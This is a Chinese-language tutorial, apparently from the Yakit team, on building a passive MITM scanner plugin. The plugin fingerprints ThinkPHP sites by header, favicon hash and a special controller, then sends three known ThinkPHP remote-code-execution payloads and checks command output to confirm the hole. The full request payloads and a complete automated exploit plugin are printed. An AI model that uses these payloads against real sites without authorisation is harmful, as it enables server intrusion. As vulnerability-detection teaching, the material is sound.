## 01 环境搭建

环境使用 http://vulfocus.io/，启动一个thinkphp实例

## 02 指纹检测

因为可能同时开启多个被动扫描插件，如果所有网站都做一遍扫描，会造成很大程度上的资源浪费，可能会导致代理变慢，所以在开始扫描前需要对网站进行指纹识别。

## 03 header特征

使用fofa搜索app="thinkphp"

发现大多数thinkphp的站点header都有X-Powered-By: ThinkPHP

还有X-Powered-By: thinkphp-bjyadmin（可能是经thinkphp二开的框架）

所以可以通过正则，对header进行匹配：

    
    
    thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]// headers是返回包的headercheckHeader = fn(headers){for _,thinkphpFinger = range thinkphpFingers{if re.Match(thinkphpFinger,headers) {return true}}return false}

## 04 favicon hash特征

通过thinkphp框架的默认favicon.ico识别

在yak里可以直接获取到站点favicon.ico的hash

    
    
    hash, err = http.RequestFaviconHash(<favicon.ico地址>)

得到thinkphp的favicon.ico的hash为1165838194，所以做如下判断

    
    
    // rootUrl是网站根路径chechIcon2 = fn(rootUrl){hash, err = http.RequestFaviconHash(rootUrl+"favicon.ico")return hash == "1165838194"}

## 05 thinkphp的特殊Controller

在p牛的博客中看到thinkphp有个控制器4e5e5d7364f443e28fbf0d3ae744a59a，会返回站点的图标

所以当http://xxx.xx/index.php?c=4e5e5d7364f443e28fbf0d3ae744a59a返回一个图片时，就可以判定这是thinkphp站点

    
    
    rsp,_ = http.Get("http://xxx.xx/?c=4e5e5d7364f443e28fbf0d3ae744a59a")rspB,_ = http.dump(rsp)header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)println(string(body))

输出如图

![](https://image.3001.net/images/20220321/1647831419_6237e97b831f263024d55.jpg!small)

从这里提取出两个指纹"IHDR"和"PNG"，如下

    
    
    // rootUrl是网站根路径chechIcon1 = fn(rootUrl){u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"rsp,_ = http.Get(u)rspB,_ = http.dump(rsp)header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)return str.Contains(string(body),"IHDR") && (str.Contains(string(body),"PNG") || str.Contains(string(body),"JPEG")) }

## 06 漏洞检测

如果返回包中包含预期的结果，就可以判定命令执行成功了，在此基础上，这个"预期的结果"还要和正常返回包区分开

如果是linux机器，可以执行这条命令echo -n 'asdasczxc' |
md5sum，如果网站返回包包含asdasczxc的hash，则说明命令执行成功

如果是windows机器，可以执行dir
C:\Windows\，因为windows机器C:\Windows\目录下有system.ini文件，所以如果返回包包含system.ini，则说明命令执行成功

## 07 payload

可以通过fuzz标签去写payload，如

    
    
    GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1Host: {{params(target)}}Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: deflateAccept-Language: zh-CN,zh;q=0.9Cache-Control: max-age=0Connection: closeContent-Length: 0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36

在poc.HTTP支持使用fuzz标签

## 08 持久化

yak的risk库可以对数据持久化

例如：

    
    
    risk.NewRisk("https://www.baidu.com", risk.title("html源码泄露"), risk.type("敏感信息泄露"),risk.level("高危"))

## 09 MITM插件编写

mitm模块主要提供了5个hook方法，创建新插件时的模板有详细的注解介绍

因为每个网站只需要检测一次，所以选用mirrorNewWebsite方法（每当出现一个新网站时，此方法会被调用）

由于用户正常访问网站时，也会对favicon.ico进行获取，所以可以在mirrorNewWebsitePath方法中直接拿到favicon.ico，计算hash进行判断，相比在mirrorNewWebsite方法中使用http.RequestFaviconHash获取hash，减少了一次对favicon.ico的请求

代码如下

    
    
    rootUrl = str.ParseStringUrlToWebsiteRootPath(url)// 手动对favicon.ico的hash计算方法就是，先base64，再MMH3Hash32计算if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{testExp(rootUrl)}

上面这方法调试发现，即使是第一次访问的网站，有时浏览器不会请求favicon.ico

所以还是用常规的http.RequestFaviconHash方法去获取hash

## 10 最终代码

    
    
    payloads = [{"name":"thinkphp5.0.23 5.0.7 ~ 5.0.23命令执行","payload":`GET /index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]={{url({{params(cmd)}})}} HTTP/1.1Host: {{params(target)}}Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: deflateAccept-Language: zh-CN,zh;q=0.9Cache-Control: max-age=0Connection: closeContent-Length: 0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36`},{"name":"Thinkphp captcha命令执行","payload":`POST /index.php HTTP/1.1Host: {{params(target)}}Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: deflateAccept-Language: zh-CN,zh;q=0.9Cache-Control: no-cacheConnection: closeContent-Length: 52Content-Type: application/x-www-form-urlencodedOrigin: http://123.58.236.76:59844Pragma: no-cacheReferer: http://123.58.236.76:59844/index.php?s=index/index/indexUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36s={{url({{params(cmd)}})}}&_method=__construct&filter%5B%5D=system`},{"name":"5.1.x命令执行","payload":`GET /index.php?s=index/\think\Request/input&filter=system&data={{url({{params(cmd)}})}} HTTP/1.1Host: {{params(target)}}Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: deflateAccept-Language: zh-CN,zh;q=0.9Cache-Control: max-age=0Connection: closeContent-Length: 0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36`}]thinkphpFingers = ["X-Powered-By: .*((?i)thinkphp).*"]testExp = fn(rootUrl){yakit_output(sprintf("%s发现thinkphp框架",rootUrl))host,port,_ = str.ParseStringToHostPort(rootUrl)target = sprintf("%s:%d",host,port)for _,payload = range payloads{out = ""payloadR = ""randomStr = str.RandStr(20)result = codec.Md5(randomStr)cmd = sprintf("echo -n '%v' | md5sum", randomStr)rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": cmd,"target": target}))headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)// println(string(headers))if str.MatchAllOfSubString(body, result){payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)out = sprintf("%s存在漏洞, pocName:%s, OS: Linux",rootUrl,payload["name"])}rsp,req,_ = poc.HTTP(payload["payload"], poc.params({"cmd": "dir C:\\Windows\\","target": target}))headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)// println(string(headers))if str.MatchAllOfSubString(body, "system.ini"){payloadR,_ = str.SplitHTTPHeadersAndBodyFromPacket(req)out = sprintf("%s存在漏洞, pocName:%s, OS: Windows",rootUrl,payload["name"])}if out != ""{yakit_output(out)risk.NewRisk(rootUrl,risk.title(sprintf("%s存在RCE漏洞",rootUrl)),risk.details(out),risk.type("RCE"),risk.payload(payloadR))}}}checkHeader = fn(headers){for _,thinkphpFinger = range thinkphpFingers{if re.Match(thinkphpFinger,headers) {return true}}return false}chechIcon1 = fn(rootUrl){u = rootUrl+"?c=4e5e5d7364f443e28fbf0d3ae744a59a"rsp,_ = http.Get(u)rspB,_ = http.dump(rsp)header,body = str.SplitHTTPHeadersAndBodyFromPacket(rspB)return str.Contains(string(body),"IHDR") && (str.Contains(string(body),"PNG") || str.Contains(string(body),"JPEG")) }chechIcon2 = fn(rootUrl){hash, err = http.RequestFaviconHash(rootUrl+"favicon.ico")return hash == "1165838194"}# mirrorNewWebsite 每新出现一个网站，这个网站的第一个请求，将会在这里被调用！mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {rootUrl = str.ParseStringUrlToWebsiteRootPath(url)headers, body = str.SplitHTTPHeadersAndBodyFromPacket(rsp)if checkHeader(headers) || chechIcon2(rootUrl) || chechIcon1(rootUrl){testExp(rootUrl)}}# mirrorNewWebsitePath 每新出现一个网站路径，关于这个网站路径的第一个请求，将会在这里被传入回调mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {// rootUrl = str.ParseStringUrlToWebsiteRootPath(url)// if str.EndsWith(url, "favicon.ico") && codec.MMH3Hash32(codec.EncodeBase64(rsp)) == "1165838194"{//     testExp(rootUrl)// }}

## 11 插件效果

可在插件仓库中更新插件进行使用~

![1647831570_6237ea12572b2e7b837ee.jpg!small?1647831568554](https://image.3001.net/images/20220321/1647831570_6237ea12572b2e7b837ee.jpg!small?1647831568554)

![1647831725_6237eaad5aa6c6f879406.jpg!small?1647831723504](https://image.3001.net/images/20220321/1647831725_6237eaad5aa6c6f879406.jpg!small?1647831723504)

## 12 END

感兴趣的师傅可以去官网看看教程，来写一下属于自己的插件~

官网教程：https://www.yaklang.io/products/intro

下载地址：https://github.com/yaklang/yakit

我们还在招人中~~对职位和我们小小的技术讨论组感兴趣的朋友可以加微信详聊~~

[诚意满满的招聘来啦~](http://mp.weixin.qq.com/s?__biz=MzAxOTAzOTU3Mw==&mid=2247484505&idx=1&sn=4196ce610c893a447a8a620cc3508ea6&chksm=9bcc5063acbbd975979467ea6e24fda246569ffb044afbc1ea8c784635daf7157e71341723d6&scene=21#wechat_redirect)

